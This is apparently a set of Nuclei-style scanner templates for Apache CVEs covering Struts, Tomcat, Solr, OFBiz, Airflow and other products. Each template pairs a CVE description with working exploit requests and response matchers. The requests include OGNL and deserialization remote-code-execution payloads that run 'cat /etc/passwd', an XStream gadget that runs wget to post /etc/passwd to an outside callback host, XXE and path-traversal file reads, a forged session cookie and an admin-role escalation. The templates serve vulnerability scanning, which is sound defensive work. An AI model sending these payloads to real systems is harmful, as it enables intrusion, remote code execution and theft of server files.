- tags - cve,cve2020,apache,airflow,auth-bypass

## Requests

### Step - 1

```
GET /admin/ HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /admin/ HTTP/1.1
Host: {{Hostname}}
Cookie: session=.eJwlzUEOwiAQRuG7zLoLpgMM9DIE6D-xqdEEdGW8u03cvy_vQ8UG5o02q_eJhcqx00YdDaKao6p5ZZe89ZyFUaPExqCF-hxWXs8Tj6tXt_rGnKpxC6vviTNiELBxErerBBZk9Zd7T4z_hOn7A0cWI94.YwJ5bw.LzJjDflCTQE2BfJ7kXcsOi49vvY

```

### Matchers

**Type - word**

- part - body_2
- words
  1. DAG
  2. Recent Tasks
  3. Users
  4. SLA Misses
  5. Task Instances
- condition - and

**Type - dsl**

- dsl
  1. contains(body_1, 'Redirecting...')
  2. status_code_1 == 302
- condition - and

---

# Apache Unomi \<1.5.2 - Remote Code Execution

## Description

- Apache Unomi allows conditions to use OGNL and MVEL scripting which
  offers the possibility to call static Java classes from the JDK
  that could execute code with the permission level of the running Java process.
  This vulnerability affects all versions of Apache Unomi prior to 1.5.2.

- severity - critical
- tags - cve,cve2020,apache,rce

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/context.json
  - {
    "filters": [
    {
    "id": "nuclei",
    "filters": [
    {
    "condition": {
    "parameterValues": {
    "nuclei": "script::Runtime.getRuntime().exec('id')"
    },
    "type": "profilePropertyCondition"
    }
    }
    ]
    }
    ],
    "sessionId": "nuclei"
    }

### Matchers

**Type - regex**

- part - body
- regex
  1. (profile|session)(Id|Properties|Segments)
  2. [a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}
- condition - and

**Type - word**

- part - header
- words
  1. application/json
  2. context-profile-id
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Tomcat Remote Command Execution

## Description

- When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if
  a) an attacker is able to control the contents and name of a file on the server; and
  b) the server is configured to use the PersistenceManager with a FileStore; and
  c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and
  d) the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over; then, using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control.
  Note that all of conditions a) to d) must be true for the attack to succeed.

- severity - high
- tags - rce,packetstorm,cve,cve2020,apache,tomcat

## Requests

- Method - GET

### URL

- {{BaseURL}}/index.jsp

### Matchers

**Type - status**

- status
  1. 500

**Type - word**

- part - body
- words
  1. Exception
  2. ObjectInputStream
  3. PersistentManagerBase
- condition - and

---

# Apache ActiveMQ Fileserver - Arbitrary File Write

## Description

- Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via an HTTP PUT followed by an HTTP MOVE request via the Fileserver web application.
- severity - critical
- tags - fileupload,kev,edb,cve,cve2016,apache,activemq,intrusive

## Requests

### Step - 1

```
PUT /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

{{randstr}}

```

### Step - 2

```
GET /fileserver/test.txt HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - dsl**

- dsl
  1. status_code_1==204
  2. status_code_2==200
  3. contains((body_2), '{{randstr}}')
- condition - and

---

# Apache mod_userdir CRLF injection

## Description

- Apache CRLF injection allowing HTTP response splitting attacks on sites using mod_userdir.
- severity - medium
- tags - cve,cve2016,crlf,generic,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}/~user/%0D%0ASet-Cookie:crlfinjection

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Set-Cookie\s*?:(?:\s*?|._?;\s_?))(crlfinjection=crlfinjection)(?:\s\*?)(?:$|;)

---

# Apache S2-032 Struts - Remote Code Execution

## Description

- Apache Struts 2.3.19 to 2.3.20.2, 2.3.21 to 2.3.24.1, and 2.3.25 to 2.3.28, when dynamic method invocation is enabled, allows remote attackers to execute arbitrary code via method: prefix (related to chained expressions).

- severity - high
- tags - cve,cve2016,struts,rce,apache

## Requests

### Step - 1

```
GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- regex
  1. root:.\*:0:0:

---

# Apache Tomcat JK Connect \<=1.2.44 - Manager Access

## Description

- Apache Tomcat JK (mod_jk) Connector 1.2.0 to 1.2.44 allows specially constructed requests to expose application functionality through the reverse proxy. It is also possible in some configurations for a specially constructed request to bypass the access controls configured in httpd. While there is some overlap between this issue and CVE-2018-1323, they are not identical.

- severity - high
- tags - cve,cve2018,apache,tomcat

## Requests

- Method - GET

### URL

- {{BaseURL}}/jkstatus
- {{BaseURL}}/jkstatus;

### Matchers

**Type - word**

- words
  1. JK Status Manager

**Type - status**

- status
  1. 200

---

# Apache Struts2 S2-057 - Remote Code Execution

## Description

- Apache Struts versions 2.3 to 2.3.34 and 2.5 to 2.5.16 suffer from possible remote code execution when alwaysSelectFullNamespace is true (either by user or a plugin like Convention Plugin) and then: results are used with no namespace and in same time, its upper package have no or wildcard namespace and similar to results, same possibility when using url tag which doesn''t have value and action set and in same time, its upper package have no or wildcard namespace.

- severity - high
- tags - cve,cve2018,apache,rce,struts,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/etc/passwd%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/actionChain1.action

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Tika \<1.1.8- Header Command Injection

## Description

- Apache Tika versions 1.7 to 1.17 allow clients to send carefully crafted headers to tika-server that could be used to inject commands into the command line of the server running tika-server. This vulnerability only affects those running tika-server on a server that is open to untrusted clients.
- severity - high
- tags - edb,cve,cve2018,apache,tika,rce

## Requests

- Method - PUT

---

# Apache Tomcat - Open Redirect

## Description

- Apache Tomcat versions prior to 9.0.12, 8.5.34, and 7.0.91 are prone to an open-redirection vulnerability because it fails to properly sanitize user-supplied input.
- severity - medium
- tags - tomcat,redirect,cve,cve2018,apache

## Requests

- Method - GET

### URL

- {{BaseURL}}//interact.sh

### Matchers

**Type - regex**

- regex
  1. (?m)^(L|l)ocation: (((http|https):)?//(www.)?)?interact.sh
- part - header

---

# Apache ActiveMQ \<=5.15.5 - Cross-Site Scripting

## Description

- Apache ActiveMQ versions 5.0.0 to 5.15.5 are vulnerable to cross-site scripting via the web based administration console on the queue.jsp page. The root cause of this issue is improper data filtering of the QueueFilter parameter.
- severity - medium
- tags - cve,cve2018,apache,activemq,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68

### Matchers

**Type - word**

- words
  1. ">\<script>alert("1")\</script>

**Type - word**

- words
  1. /html
- part - header

**Type - status**

- status
  1. 200

---

# Apache OFBiz 16.11.04 - XML Entity Injection

## Description

- Apache OFBiz 16.11.04 is susceptible to XML external entity injection (XXE injection).

- severity - high
- tags - cve,cve2018,apache,ofbiz,xxe

## Requests

### Step - 1

```
POST /webtools/control/xmlrpc HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache httpd \<=2.4.29 - Arbitrary File Upload

## Description

- Apache httpd 2.4.0 to 2.4.29 is susceptible to arbitrary file upload vulnerabilities via the expression specified in \<FilesMatch>, which could match '$' to a newline character in a malicious filename rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are externally blocked, but only by matching the trailing portion of the filename.
- severity - high
- tags - apache,httpd,fileupload,vulhub,cve,cve2017,intrusive

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKc8fBVDo558U4hbJ

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"

{{randstr_1}}

------WebKitFormBoundaryKc8fBVDo558U4hbJ
Content-Disposition: form-data; name="name"

{{randstr}}.php\x0A
------WebKitFormBoundaryKc8fBVDo558U4hbJ--

```

### Step - 2

```
GET /{{randstr}}.php\x0A HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip,deflate
Accept: */*

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_2, "{{randstr_1}}")

---

# Apache Struts2 S2-052 - Remote Code Execution

## Description

- The REST Plugin in Apache Struts 2.1.1 through 2.3.x before 2.3.34 and 2.5.x before 2.5.13 uses an XStreamHandler with an instance of XStream for deserialization without any type of filtering, which can lead to remote code execution when deserializing XML payloads.
- severity - high
- tags - cve,cve2017,apache,rce,struts,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/struts2-rest-showcase/orders/3
- {{BaseURL}}/orders/3
  - <map>
      <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="java.lang.ProcessBuilder">
                          <command>
                            <string>wget</string>
                            <string>--post-file</string>
                            <string>/etc/passwd</string>
                  <string>{{interactsh-url}}</string>
                          </command>
                          <redirectErrorStream>false</redirectErrorStream>
                        </next>
                      </iter>
                      <filter class="javax.imageio.ImageIO$ContainsFilter">
                        <method>
                          <class>java.lang.ProcessBuilder</class>
                          <name>start</name>
                          <parameter-types/>
                        </method>
                        <name>asdasd</name>
                      </filter>
                      <next class="string">asdasd</next>
                    </serviceIterator>
                    <lock/>
                  </cipher>
                  <input class="java.lang.ProcessBuilder$NullInputStream"/>
                  <ibuffer></ibuffer>
                  <done>false</done>
                  <ostart>0</ostart>
                  <ofinish>0</ofinish>
                  <closed>false</closed>
                </is>
                <consumed>false</consumed>
              </dataSource>
              <transferFlavors/>
            </dataHandler>
            <dataLen>0</dataLen>
          </value>
        </jdk.nashorn.internal.objects.NativeString>
        <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
      </entry>
      <entry>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
        <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
      </entry>
    </map>

### Matchers

**Type - word**

- words
  1. Debugging information
  2. com.thoughtworks.xstream.converters.collections.MapConverter
- condition - and

**Type - status**

- status
  1. 500

---

# Apache Struts2 S2-053 - Remote Code Execution

## Description

- Apache Struts 2.0.0 through 2.3.33 and 2.5 through 2.5.10.1 uses an unintentional expression in a Freemarker tag instead of string literals, which makes it susceptible to remote code execution attacks.
- severity - critical
- tags - cve,cve2017,apache,rce,struts

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D

### Matchers

**Type - regex**

- regex
  1. root:.\*:0:0:

**Type - status**

- status
  1. 200

---

# Apache Solr \<= 7.1 - XML Entity Injection

## Description

- Apache Solr with Apache Lucene before 7.1 is susceptible to remote code execution by exploiting XXE in conjunction with use of a Config API add-listener command to reach the RunExecutableListener class. Elasticsearch, although it uses Lucene, is NOT vulnerable to this. Note that the XML external entity expansion vulnerability occurs in the XML Query Parser which is available, by default, for any query request with parameters deftype=xmlparser and can be exploited to upload malicious data to the /upload request handler or as Blind XXE using ftp wrapper in order to read arbitrary local files from the Solr server. Note also that the second vulnerability relates to remote code execution using the RunExecutableListener available on all affected versions of Solr.
- severity - critical
- tags - oast,xxe,vulhub,cve,cve2017,solr,apache

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
GET /solr/{{core}}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22https%3A%2F%2F{{interactsh-url}}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. http

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Apache Struts2 S2-053 - Remote Code Execution

## Description

- Apache Struts 2.1.x and 2.3.x with the Struts 1 plugin might allow remote code execution via a malicious field value passed in a raw message to the ActionMessage.
- severity - critical
- tags - cve,cve2017,apache,rce,struts,kev

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/integration/saveGangster.action
  - name=%25%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%71%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%23%71%29%7d&age=10&\_\_checkbox_bustedBefore=true&description=

### Matchers

**Type - word**

- part - header
- words
  1. Content-Type: text/html

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
- condition - and

**Type - status**

- status
  1. 200

---

# Apache Struts 2 - Remote Command Execution

## Description

- Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is vulnerable to remote command injection attacks through incorrectly parsing an attacker's invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server.
- severity - critical
- tags - apache,kev,msf,cve,cve2017,struts,rce

## Requests

### Step - 1

```
GET / HTTP/1.1
Host: {{Hostname}}
Accept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*

```

### Matchers

**Type - word**

- words
  1. X-Hacker: Bounty Plz
- part - header

---

# Apache Tomcat Servers - Remote Code Execution

## Description

- Apache Tomcat servers 7.0.{0 to 79} are susceptible to remote code execution. By design, you are not allowed to upload JSP files via the PUT method. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers that have enabled PUT method by using a specially crafted HTTP request.

- severity - high
- tags - rce,tomcat,kev,cisa,vulhub,cve,cve2017,apache,fileupload

## Requests

- Method - PUT

---

# Apache CouchDB 1.7.0 / 2.x \< 2.1.1 - Remote Privilege Escalation

## Description

- Due to differences in the Erlang-based JSON parser and JavaScript-based JSON parser, it is possible in Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit \_users documents with duplicate keysfor 'roles' used for access control within the database, including the special case '\_admin' role, that denotes administrative users. In combination with CVE-2017-12636 (Remote Code Execution), this can be used to give non-admin users access to arbitrary shell commands on the server as the database system user. The JSON parser differences result in behavior that if two 'roles' keys are available in the JSON, the second one will be used for authorizing the document write, but the first 'roles' key is used for subsequent authorization for the newly created user. By design, users can not assign themselves roles. The vulnerability allows non-admin users to give themselves admin privileges.
- severity - critical
- tags - cve,cve2017,couchdb,apache

## Requests

### Step - 1

```
PUT /_users/org.couchdb.user:poc HTTP/1.1
Host:  {{Hostname}}
Accept: application/json

{
  "type": "user",
  "name": "poc",
  "roles": ["_admin"],
  "roles": [],
  "password": "123456"
}

```

### Matchers

**Type - word**

- part - header
- words
  1. application/json
  2. Location:

**Type - word**

- part - body
- words
  1. org.couchdb.user:poc
  2. conflict
  3. Document update conflict

**Type - status**

- status
  1. 201
  2. 409

---

# Apache \<= 2.4.48 - Mod_Proxy SSRF

## Description

- Apache 2.4.48 and below contain an issue where uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user.
- severity - critical
- tags - cve,cve2021,ssrf,apache,mod-proxy,kev

## Requests

- Method - GET

### URL

- {{BaseURL}}/?unix:{{repeat("A", 7701)}}|http://interact.sh/

### Matchers

**Type - word**

- words
  1. Interactsh Server

---

# Apache Struts2 S2-062 - Remote Code Execution

## Description

- Apache Struts2 S2-062 is vulnerable to remote code execution. The fix issued for CVE-2020-17530 (S2-061) was incomplete, meaning some of the tag's attributes could still perform a double evaluation if a developer applied forced OGNL evaluation by using the %{...} syntax.
- severity - critical
- tags - cve,cve2021,apache,rce,struts,struts2

## Requests

### Step - 1

```
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 1095

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name="id"

%{
(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +
(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +
(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +
(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +
(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))
}

------WebKitFormBoundaryl7d1B1aGsV2wcZwF—

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:

---

# Apache Airflow - Unauthenticated Variable Import

## Description

- Apache Airflow Airflow >=2.0.0 and \<2.1.3 does not protect the variable import endpoint which allows unauthenticated users to hit that endpoint to add/modify Airflow variables used in DAGs, potentially resulting in a denial of service, information disclosure or remote code execution.
- severity - critical
- tags - cve,cve2021,apache,airflow,rce

## Requests

### Step - 1

```
GET /login/ HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```

### Step - 2

```
POST /variable/varimport HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB874qcjbpxTP1Hj7
Referer: {{RootURL}}/admin/variable/

------WebKitFormBoundaryB874qcjbpxTP1Hj7
Content-Disposition: form-data; name="csrf_token"

{{csrf}}
------WebKitFormBoundaryB874qcjbpxTP1Hj7
Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
Content-Type: application/json

{
    "type": "{{randstr}}"
}

------WebKitFormBoundaryB874qcjbpxTP1Hj7--

```

### Matchers

**Type - dsl**

- dsl
  1. contains(body_1, "Sign In - Airflow")
  2. status_code_2 == 302
  3. contains(all_headers_2, "session=.")
- condition - and

**Type - word**

- words
  1. You should be redirected automatically to target URL: \<a href="/">

### Extractors

**Type - regex**

- name - csrf
- group - 1
- internal - True
- regex
  1. type="hidden" value="(.\*?)">

---

# Apache Druid - Local File Inclusion

## Description

- Apache Druid ingestion system is vulnerable to local file inclusion. The InputSource is used for reading data from a certain data source. However, the HTTP InputSource allows authenticated users to read data from other sources than intended, such as the local file system, with the privileges of the Druid server process. This is not an elevation of privilege when users access Druid directly, since Druid also provides the Local InputSource, which allows the same level of access. But it is problematic when users interact with Druid indirectly through an application that allows users to specify the HTTP InputSource, but not the Local InputSource. In this case, users could bypass the application-level restriction by passing a file URL to the HTTP InputSource. This issue was previously mentioned as being fixed in 0.21.0 as per CVE-2021-26920 but was not fixed in 0.21.0 or 0.21.1.
- severity - medium
- tags - cve,cve2021,apache,lfi,auth-bypass,druid

## Requests

### Step - 1

```
POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":[" file:///etc/passwd "]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string", "parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"no_ such_ column","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}

```

### Matchers

**Type - regex**

- part - body
- regex
  1. root:.\*:0:0:
  2. druid:\*:1000:1000:
- condition - or

---

# Apache 2.4.49 - Path Traversal and Remote Code Execution

## Description

- A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by "require all denied" these requests can succeed. Additionally, this flaw could leak the source of interpreted files like CGI scripts. This issue is known to be exploited in the wild. This issue only affects Apache 2.4.49 and not earlier versions.
- severity - high
- tags - cve,cve2021,lfi,rce,apache,misconfig,traversal,kev

## Requests

### Step - 1

```
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

echo Content-Type: text/plain; echo; {{cmd}}

```

### Matchers

**Type - regex**

- name - LFI
- regex
  1. root:.\*:0:0:

**Type - word**

- name - RCE
- words
  1. CVE-2021-41773-POC

---

# Apache Solr \<=8.8.1 - Server-Side Request Forgery

## Description

- Apache Solr versions 8.8.1 and prior contain a server-side request forgery vulnerability. The ReplicationHandler (normally registered at "/replication" under a Solr core) in Apache Solr has a "masterUrl" (also "leaderUrl" alias) parameter that is used to designate another ReplicationHandler on another Solr core to replicate index data into the local core. To prevent a SSRF vulnerability, Solr ought to check these parameters against a similar configuration it uses for the "shards" parameter.
- severity - critical
- tags - cve,cve2021,apache,solr,ssrf

## Requests

### Step - 1

```
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Step - 2

```
GET /solr/{{core}}/replication/?command=fetchindex&masterUrl=https://interact.sh HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

```

### Matchers

**Type - word**

- words
  1. \<str name="status">OK\</str>
- part - body

### Extractors

**Type - regex**

- internal - True
- name - core
- group - 1
- regex
  1. "name"\:"(.\*?)"

---

# Apache Superset - Default Login

## Description

- Apache Superset up to and including 1.3.2 allowed for registered database connections password leak for authenticated users. This information could be accessed in a non-trivial way.

- severity - medium
- tags - cve,cve2021,apache,superset,default-login

## Requests

### Step - 1

```
GET /login/ HTTP/1.1
Host: {{Hostname}}

```

### Step - 2

```
POST /login/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

csrf_token={{csrf_token}}&username={{username}}&password={{password}}

```

### Step - 3

```
GET /dashboard/list/ HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - header_2
- words
  1. session

**Type - word**

- part - body_3
- words
  1. DashboardFilterStateRestApi

### Extractors

**Type - regex**

- name - csrf_token
- group - 1
- part - body
- regex
  1. name="csrf_token" type="hidden" value="(.\*)"
- internal - True

**Payloads**- username

- password

---

# Apache Cassandra Load UDF RCE

## Description

- When running Apache Cassandra with the following configuration: enable_user_defined_functions: true enable_scripted_user_defined_functions: true enable_user_defined_functions_threads: false it is possible for an attacker to execute arbitrary code on the host. The attacker would need to have enough permissions to create user defined functions in the cluster to be able to exploit this. Note that this configuration is documented as unsafe, and will continue to be considered unsafe after this CVE.
- severity - critical
- tags - cve,cve2021,network,rce,apache,cassandra

---

# Apache OFBiz \<17.12.06 - Arbitrary Code Execution

## Description

- Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.

- severity - critical
- tags - packetstorm,cve,cve2021,apache,ofbiz,deserialization,rce

## Requests

### Step - 1

```
POST /webtools/control/SOAPService HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8'?>
<soapenv:Envelope
  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
    <soapenv:Body>
      <ns1:clearAllEntityCaches xmlns:ns1="http://ofbiz.apache.org/service/">
          <ns1:cus-obj>{{generate_java_gadget("dns", "https://{{interactsh-url}}", "hex")}}</ns1:cus-obj>
      </ns1:clearAllEntityCaches>
    </soapenv:Body>
</soapenv:Envelope>

```

### Matchers

**Type - word**

- part - interactsh_protocol
- words
  1. dns

**Type - word**

- part - body
- words
  1. errorMessage
- condition - and

**Type - word**

- part - header
- words
  1. OFBiz.Visitor=

---

# Apache ShenYu Admin JWT - Authentication Bypass

## Description

- Apache ShenYu 2.3.0 and 2.4.0 allow Admin access without proper authentication. The incorrect use of JWT in ShenyuAdminBootstrap allows an attacker to bypass authentication.
- severity - critical
- tags - cve,cve2021,apache,jwt,shenyu

## Requests

### Step - 1

```
